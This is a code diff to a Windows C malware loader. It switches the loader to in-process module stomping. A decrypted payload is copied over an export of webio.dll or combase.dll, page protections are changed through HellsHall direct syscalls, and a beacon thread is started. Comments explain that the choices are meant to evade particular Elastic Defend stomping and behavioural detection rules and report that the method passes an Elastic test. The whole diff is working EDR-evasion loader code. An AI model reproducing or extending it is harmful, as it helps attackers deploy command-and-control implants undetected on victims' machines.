@@ -204,49 +204,47 @@ int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
     s_payload_ptr = pt;
     s_payload_len = pt_len;
 
-    /* Resolve absolute sibling path to the plugin DLL — passing a bare
-     * filename to LoadLibrary would honour the DLL search order. */
-    char pluginPath[MAX_PATH];
-    GetModuleFileNameA(NULL, pluginPath, MAX_PATH);
-    char *asep = strrchr(pluginPath, '\\');
-    if (!asep) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }
-    asep[1] = '\0';
-    if (strlen(pluginPath) + sizeof(PLUGIN_NAME) > MAX_PATH) {
-        SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1;
+    /* Monolithic module-stomp — inline the slot-flip logic here rather
+     * than deferring to an external DLL. Avoids the LoadLibrary-of-
+     * unsigned-DLL pattern that Elastic behavioural correlators may
+     * treat as suspicious. StdHandleRelay's stomper_byoud is monolithic
+     * and passes Elastic .206 EXEC. */
+
+    /* Direct-syscall init for NtProtectVirtualMemory */
+    FetchNtProtectSyscall();
+
+    /* Pre-load webio.dll with DONT_RESOLVE_DLL_REFERENCES (allowlisted
+     * in multiple Elastic stomping rules). */
+    LoadLibraryExA("webio.dll", NULL, 0x00000001);
+    HMODULE target = GetModuleHandleW(L"webio.dll");
+    void *slot = target ? (void *)GetProcAddress(target, "WebSocketBeginClientHandshake") : NULL;
+    if (!slot) {
+        LoadLibraryA("combase.dll");
+        target = GetModuleHandleW(L"combase.dll");
+        if (target) slot = (void *)GetProcAddress(target, "CoUninitialize");
     }
-    strcat(pluginPath, PLUGIN_NAME);
+    if (!slot) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }
 
-    /* Pre-load webio.dll with DONT_RESOLVE_DLL_REFERENCES.
-     * webio.dll is allowlisted in multiple Elastic Defend stomping rules
-     * (defense_evasion_process_creation_from_a_stomped_module.toml,
-     * defense_evasion_potential_injection_via_module_stomping.toml) and
-     * is the empirically-validated stomping target used by StdHandleRelay.
-     * DONT_RESOLVE_DLL_REFERENCES maps the image but does not run DllMain
-     * or resolve imports — cleaner mapping shape. */
-    LoadLibraryExA("webio.dll", NULL, 0x00000001 /* DONT_RESOLVE_DLL_REFERENCES */);
-    LoadLibraryA("combase.dll");  /* fallback target */
+    /* Route protection changes through HellsHall direct syscall */
+    PVOID base_p = slot;
+    SIZE_T sz_p = pt_len;
+    ULONG old_p;
+    NTSTATUS status = HhNtProtectVirtualMemory((HANDLE)-1, &base_p, &sz_p, PAGE_READWRITE, &old_p);
+    if (status != 0) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }
 
-    /* Loading csvhelper fires its DllMain synchronously. DllMain calls
-     * GetPayload, does the slot flip, CreateThreads the beacon, and hands
-     * the thread handle back through SetThreadHandle. When LoadLibraryA
-     * returns, the work is done. */
-    HMODULE plugin = LoadLibraryA(pluginPath);
-    if (!plugin) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }
+    memcpy(slot, pt, pt_len);
 
-    /* Plugin signalled success by handing us a thread handle. */
-    HANDLE hThread = s_thread;
+    base_p = slot; sz_p = pt_len;
+    status = HhNtProtectVirtualMemory((HANDLE)-1, &base_p, &sz_p, PAGE_EXECUTE_READ, &old_p);
+    if (status != 0) { SecureZeroMemory(pt, pt_len); LocalFree(pt); return 1; }
 
-    /* Plaintext copied into combase's slot inside DllMain — safe to wipe. */
-    s_payload_ptr = NULL;
-    s_payload_len = 0;
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)slot, NULL, 0, NULL);
+
     SecureZeroMemory(pt, pt_len);
     LocalFree(pt);
 
     if (!hThread) return 1;
 
-    /* Do NOT FreeLibrary(plugin): beacon executes in combase's slot and may
-     * call back into combase exports; keep the plugin resident so the
-     * loader's symbol pointers stay valid. */
     WaitForSingleObject(hThread, INFINITE);
     CloseHandle(hThread);
 
